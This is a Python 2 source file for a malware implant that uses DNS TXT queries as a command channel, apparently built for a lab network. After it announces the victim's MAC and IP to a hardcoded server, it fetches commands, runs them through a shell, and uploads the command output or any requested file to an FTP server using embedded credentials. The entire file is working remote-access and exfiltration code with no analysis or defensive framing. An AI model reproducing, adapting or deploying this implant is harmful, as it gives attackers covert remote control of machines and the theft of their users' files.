# -*- coding: utf-8 -*-
#!/usr/bin/env python

from Crypto.Cipher import AES
import base64
import os
import struct
import socket
import random
import subprocess
import os.path
import time
from ftplib import FTP
from uuid import getnode as get_mac

HOST = ''
DNS_IP = "192.168.56.102"
DNS_PORT = 53
DNS_SIGNAL_PORT = 1030
FTP_IP = "192.168.56.102"
FTP_PORT = 21
OUTPUT_FILE = "res.txt"

def send_signal(content):
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.sendto(content, (DNS_IP, DNS_SIGNAL_PORT))

def get_my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((DNS_IP, 0))
    return s.getsockname()[0]

def build_packet(url):
    packet = struct.pack(">H", random.randint(0, 65535))  # Query Id
    packet += struct.pack(">H", 256)  # Flags
    packet += struct.pack(">H", 1)  # Questions
    packet += struct.pack(">H", 0)  # Answers
    packet += struct.pack(">H", 0)  # Authorities
    packet += struct.pack(">H", 0)  # Additional
    split_url = url.split(".")
    for part in split_url:
        packet += struct.pack("B", len(part))
        for byte in bytes(part):
            packet += struct.pack("c", byte)
    packet += struct.pack("B", 0)  # End of String
    packet += struct.pack(">H", 16)  # Query Type (TXT)
    packet += struct.pack(">H", 1)  # Query Class (IN)
    return packet

def upload_file(filename_local, remote_folder, filename_remote):
    ftp = FTP()
    ftp.connect(FTP_IP, FTP_PORT)
    ftp.login('lucas', '123qwe')
    file = open(filename_local, 'rb')
    if not remote_folder in ftp.nlst():
        ftp.mkd(remote_folder)
    ftp.storbinary('STOR ' + remote_folder + '/' + filename_remote, file)
    ftp.quit()
    file.close()


def decryption(encryptedCommand):
    PADDING = '{'
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
    encryption = encryptedCommand
    key = 'g0vwQgZcBCfFNduQCGFVUvudv8gUMPYp'
    cipher = AES.new(key)
    decoded = DecodeAES(cipher, encryption)
    return decoded

# Send and format this MAC address
my_mac = str(format(get_mac(), 'x'))

# Send signal to inform DNS server that malware is running
send_signal(my_mac + ';' + get_my_ip())

# Socket 1, for receiving the signal for a new request
sock1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock1.bind((HOST, DNS_PORT))

while(1):
    domain = "order0.mydomain.com"

    # Wait for signal
    print "Waiting for signal"
    sock1.recvfrom(512)
    print "Received Signal Packet"

    while(1):
        # Build packet and send DNS request
        packet = build_packet(domain)
        sock1.sendto(bytes(packet), (DNS_IP, DNS_PORT))
        print("Request Sent")

        # Get response
        data, addr = sock1.recvfrom(512)
        print("Response Received")

        #print("Response: " + data)
        rname = data[36:38]
        rtype = data[38:40]
        rclass = data[40:42]
        rttl = data[42:46]
        rdlength = data[46:48]
        txtlength = data[49]
        txt = data[50:(50+ord(txtlength))]
        command = txt.split(';')    #split the command on the first index and the number to the next order on the second
        domain = "order" + command[1] + ".mydomain.com"

        # Run command
        print command[0]
        if (os.path.isfile(command[0])):
            # if it's a file, send it
            print "Uploading file"
            upload_file(command[0], my_mac, os.path.basename(command[0]))
        else:
            # otherwise, run command and send result
            try:
                res = subprocess.check_output(command[0], shell=True)
            except subprocess.CalledProcessError as e:
                res = e.output
            file = open(OUTPUT_FILE, 'w')
            file.write(res)
            file.close()
            print "Uploading command output"
            upload_file(OUTPUT_FILE, my_mac, str(time.time()) + '.txt')
            os.remove(OUTPUT_FILE)

        #break condition
        if(command[1] == "-1"):
            break

sock1.close()